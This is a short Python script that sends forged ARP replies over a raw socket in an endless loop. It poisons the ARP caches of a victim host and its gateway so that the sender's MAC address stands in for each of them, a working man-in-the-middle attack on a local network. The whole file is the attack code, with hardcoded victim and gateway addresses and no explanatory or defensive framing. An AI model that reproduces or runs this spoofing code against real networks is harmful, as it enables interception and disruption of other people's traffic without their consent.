import socket
import struct
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

sor = '\x00\x0c\x29\x4f\x8e\x35'

victmac ='\x88\x53\x2e\x0a\x75\x3f'

gatemac = '\x84\x1b\x5e\x50\xc8\x6e'
code ='\x08\x06'
eth1 = victmac+sor+code #for victim
eth2 = gatemac+sor+code # for gateway

htype = '\x00\x01'
protype = '\x08\x00'
hsize = '\x06'
psize = '\x04'
opcode = '\x00\x02'

gate_ip = '10.0.0.1'
victim_ip = '10.0.0.6' 
gip = socket.inet_aton ( gate_ip )
vip = socket.inet_aton ( victim_ip )

arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip
arp_gateway= eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip


while 1:
	s.send(arp_victim)
	s.send(arp_gateway)


